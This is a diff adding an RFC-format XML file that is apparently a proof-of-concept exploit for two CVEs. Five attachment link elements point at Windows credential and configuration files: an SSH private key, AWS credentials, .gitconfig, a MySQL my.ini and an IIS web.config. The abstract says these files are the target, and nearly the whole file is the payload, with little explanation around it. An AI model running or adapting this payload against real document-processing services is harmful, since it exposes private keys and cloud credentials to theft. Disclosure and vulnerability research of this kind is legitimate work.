@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rfc version="3" ipr="trust200902" docName="draft-poc-windows-creds-00" category="info" submissionType="IETF">
+  <link rel="attachment" href="C:/Users/Administrator/.ssh/id_rsa"/>
+  <link rel="attachment" href="C:/Users/Administrator/.aws/credentials"/>
+  <link rel="attachment" href="C:/Users/Administrator/.gitconfig"/>
+  <link rel="attachment" href="C:/ProgramData/MySQL/my.ini"/>
+  <link rel="attachment" href="C:/inetpub/wwwroot/web.config"/>
+  <front>
+    <title>POC for Windows Credentials and Config Files</title>
+    <author fullname="Security Researcher" initials="S." surname="Researcher">
+      <organization>Security Research Lab</organization>
+      <address>
+        <email>security@example.com</email>
+      </address>
+    </author>
+    <date year="2025" month="November" day="22"/>
+    <area>Security</area>
+    <workgroup>Security Testing</workgroup>
+    <abstract>
+      <t>This POC targets Windows credentials and configuration files including SSH keys, AWS credentials, Git config, MySQL config, and IIS web.config.</t>
+    </abstract>
+  </front>
+  <middle>
+    <section anchor="intro">
+      <name>Introduction</name>
+      <t>Windows credentials read demonstration for CVE-2025-11058 and CVE-2025-11059.</t>
+    </section>
+  </middle>
+  <back/>
+</rfc>
